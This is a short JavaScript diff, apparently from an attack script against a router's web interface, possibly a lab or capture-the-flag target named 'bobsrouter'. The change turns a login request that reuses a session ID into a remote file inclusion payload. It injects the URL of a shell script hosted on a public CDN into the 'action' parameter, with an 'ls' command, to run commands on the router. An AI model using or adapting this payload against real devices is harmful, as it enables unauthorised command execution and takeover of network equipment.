@@ -33,7 +33,9 @@ xhr.onreadystatechange = function() {
 			}
 		}
 
-		xhr2.open("GET", ROUTER + "/home.php?action=login&PHPSESSID=" + sessionId, true);
+		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.23/shell";
+
+		xhr2.open("GET", ROUTER + "/home.php?action=" + SHELL + "x=ls&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
 	}
 }
